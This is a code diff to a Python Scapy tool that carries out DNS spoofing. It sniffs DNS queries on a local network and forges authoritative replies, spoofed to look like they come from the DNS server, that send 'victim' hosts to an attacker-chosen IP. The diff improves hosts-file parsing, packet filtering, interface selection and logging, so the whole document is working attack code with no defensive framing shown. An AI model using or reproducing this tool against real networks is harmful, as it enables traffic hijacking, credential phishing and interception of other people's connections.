@@ -56,12 +56,22 @@ def file_to_dict(file):
     Read hostnames file and build a mapping: hostname -> IP
     Example line in file: 1.2.3.4 www.google.com
     """
-    with open(file, 'r') as f:
-        for line in f:
-            parts = line.strip().split()
-            if len(parts) == 2:
-                ip, hostname = parts
-                dns_map[hostname.strip('.')] = ip
+    global dns_map
+    try:
+        with open(file, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith('#'):
+                    continue
+                parts = line.split()
+                if len(parts) < 2:
+                    continue
+                ip = parts[0]
+                hostname = parts[1].rstrip('.')  # normalize
+                dns_map[hostname] = ip
+    except Exception as e:
+        print(f"Error reading hostnames file {file}: {e}")
+        sys.exit(1)
 
 
 def dns_spoof(pkt):
@@ -69,15 +79,16 @@ def dns_spoof(pkt):
     Callback function triggered when a DNS query is sniffed.
     Decide whether to spoof and send a fake response.
     """
-    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #qr=0 means query, qr=1 means response
-        queried_host = pkt[DNSQR].qname.decode().strip('.')
-        
+    if pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[DNS].qr == 0: #qr=0 means query and qr=1 means response
+        qname = pkt[DNS].qd.qname.decode().rstrip('.')
         if dns_map:
-            if queried_host in dns_map:
-                spoof_ip = dns_map[queried_host]
-                create_and_send(pkt, spoof_ip)
+            if qname not in dns_map:
+                return
+            ipaddr = dns_map[qname]
         else:
-            create_and_send(pkt, attacker_ip)
+            ipaddr = attacker_ip
+        print(f"[+] Spoofing response for {qname} -> {ipaddr}")
+        create_and_send(pkt, ipaddr)
 
 def create_and_send(pkt, ipaddr):
     """
@@ -85,26 +96,31 @@ def create_and_send(pkt, ipaddr):
     2. Clean up length and checksum (let scapy auto-fill)
     3. Send it back to the victim.
     """
-    ip_layer = IP(dst=pkt[IP].src, src=pkt[IP].dst) # we want the fake packet to go back to the victim, but look like it came from the DNS server
+    ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src) # we want the fake packet to go back to the victim, but look like it came from the DNS server
     udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
+    udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
     dns_layer = DNS(
-        id=pkt[DNS].id, 
-        qr=1, 
-        aa=1, #authoritative answer
-        qd=pkt[DNS].qd, 
-        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=ipaddr)
+        id=pkt[DNS].id,
+        qr=1,
+        aa=1,
+        qd=pkt[DNS].qd,
+        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=ipaddr)
     )
     spoofed_pkt = ip_layer / udp_layer / dns_layer
-    send(spoofed_pkt, verbose=0)
+    send(spoofed_pkt, verbose=0, iface=current_iface)
 
 
 def sniff_pkts(iface, bpf):
     """
     Start sniffing packets on the network and apply DNS spoofing logic.
     """
-    if iface == '':
-        iface = conf.iface
-    sniff(iface=iface, filter=bpf, prn=dns_spoof, store=0)
+    global current_iface
+    current_iface = iface if iface else conf.iface
+    filter_str = 'udp port 53'
+    if bpf:
+        filter_str += ' and ' + bpf
+    print(f"[*] Listening on {current_iface}, filter='{filter_str}'")
+    sniff(iface=current_iface, filter=filter_str, prn=dns_spoof, store=0)
 
 
 # ========== Main Program ==========
